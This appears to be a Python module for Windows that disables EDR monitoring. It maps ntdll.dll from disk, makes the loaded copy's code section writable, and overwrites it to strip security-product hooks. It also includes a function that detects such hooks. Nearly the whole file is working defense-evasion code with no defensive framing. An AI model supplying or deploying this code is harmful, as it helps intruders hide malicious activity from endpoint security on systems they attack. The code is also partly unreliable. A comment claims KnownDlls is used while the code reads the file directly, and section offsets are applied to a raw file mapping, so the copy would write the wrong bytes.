#!/usr/bin/env python3
"""Syscall unhooking — restore ntdll.dll from disk to remove EDR hooks.

EDRs place hooks in ntdll.dll's .text section by overwriting the first
bytes of exported functions with jmp instructions to their own code.
This module maps a fresh copy of ntdll from disk and overwrites the
hooked .text section, restoring original syscall stubs.
"""
import ctypes
import ctypes.wintypes as wintypes
import os
import platform
import mmap

def unhook():
    """Restore ntdll.dll .text section from a fresh copy on disk."""
    if platform.system() != "Windows":
        return False

    try:
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)

        # Get the hooked ntdll base in our process
        hooked_base = k32.GetModuleHandleW("ntdll.dll")
        if not hooked_base:
            return False

        # Map a fresh copy of ntdll from disk
        fresh_base = _map_fresh_ntdll(k32)
        if not fresh_base:
            return False

        # Parse PE headers to find .text section in both copies
        hooked_text = _get_text_section(hooked_base)
        fresh_text = _get_text_section(fresh_base)

        if not hooked_text or not fresh_text:
            k32.UnmapViewOfFile(fresh_base)
            return False

        hooked_addr, hooked_size = hooked_text
        fresh_addr, fresh_size = fresh_text

        # Overwrite the hooked .text with fresh .text
        old_prot = wintypes.DWORD(0)
        if not k32.VirtualProtect(hooked_addr, hooked_size,
                                  0x40,  # PAGE_EXECUTE_READWRITE
                                  ctypes.byref(old_prot)):
            k32.UnmapViewOfFile(fresh_base)
            return False

        # Copy the clean .text over the hooked one
        copy_size = min(hooked_size, fresh_size)
        ctypes.memmove(hooked_addr, fresh_addr, copy_size)

        # Restore protection
        k32.VirtualProtect(hooked_addr, hooked_size,
                          old_prot.value, ctypes.byref(old_prot))

        # Unmap the fresh copy
        k32.UnmapViewOfFile(fresh_base)

        return True

    except Exception:
        return False


def _map_fresh_ntdll(k32):
    """Map a fresh copy of ntdll.dll from disk into memory."""
    # Try KnownDlls first (doesn't require file read)
    try:
        # Open the KnownDlls\ntdll.dll section object
        # This is the system's cached copy, guaranteed clean
        ntdll_path = os.path.join(
            os.environ.get("SystemRoot", r"C:\Windows"),
            "System32", "ntdll.dll"
        )

        # Open the file
        GENERIC_READ = 0x80000000
        FILE_SHARE_READ = 0x00000001
        OPEN_EXISTING = 3

        h_file = k32.CreateFileW(
            ntdll_path, GENERIC_READ, FILE_SHARE_READ,
            None, OPEN_EXISTING, 0x80, None  # FILE_ATTRIBUTE_NORMAL
        )
        if h_file == wintypes.HANDLE(-1).value:
            return None

        # Create file mapping
        PAGE_READONLY = 0x02
        h_mapping = k32.CreateFileMappingW(
            h_file, None, PAGE_READONLY, 0, 0, None
        )
        k32.CloseHandle(h_file)
        if not h_mapping:
            return None

        # Map view of file
        FILE_MAP_READ = 0x0004
        mapped = k32.MapViewOfFile(h_mapping, FILE_MAP_READ, 0, 0, 0)
        k32.CloseHandle(h_mapping)

        if not mapped:
            return None

        return mapped

    except Exception:
        return None


def _get_text_section(base):
    """Find the .text section of a PE module. Returns (address, size)."""
    try:
        # DOS header
        dos_header = (ctypes.c_byte * 64).from_address(base)
        e_lfanew = ctypes.c_uint32.from_address(base + 0x3C).value

        # PE header
        pe_sig = ctypes.c_uint32.from_address(base + e_lfanew).value
        if pe_sig != 0x00004550:  # "PE\0\0"
            return None

        # COFF header
        coff_offset = e_lfanew + 4
        num_sections = ctypes.c_uint16.from_address(base + coff_offset + 2).value
        opt_header_size = ctypes.c_uint16.from_address(base + coff_offset + 16).value

        # Section table starts after optional header
        section_offset = coff_offset + 20 + opt_header_size

        # Find .text section
        for i in range(num_sections):
            sec_addr = base + section_offset + i * 40
            name = ctypes.c_char * 8
            sec_name = name.from_address(sec_addr).value.decode("ascii", "replace").rstrip("\x00")

            if sec_name == ".text":
                virtual_size = ctypes.c_uint32.from_address(sec_addr + 8).value
                virtual_addr = ctypes.c_uint32.from_address(sec_addr + 12).value
                return (base + virtual_addr, virtual_size)

        return None
    except Exception:
        return None


def check_hooks():
    """Check if ntdll appears to be hooked.
    Returns True if hooks are detected (first bytes of common functions
    don't match expected syscall stubs).
    """
    if platform.system() != "Windows":
        return False

    try:
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)
        ntdll = k32.GetModuleHandleW("ntdll.dll")
        if not ntdll:
            return False

        # Check NtCreateFile — should start with mov r10, rcx (4C 8B D1)
        func_addr = k32.GetProcAddress(ntdll, b"NtCreateFile")
        if func_addr:
            first_bytes = bytes(ctypes.string_at(func_addr, 4))
            # Normal syscall stub: 4C 8B D1 B8 (mov r10,rcx; mov eax,)
            # Hooked: E9 (jmp) or EB (short jmp) or FF 25 (indirect jmp)
            if first_bytes[0] in (0xE9, 0xEB):
                return True
            if first_bytes[:2] == b"\xFF\x25":
                return True

        return False
    except Exception:
        return False
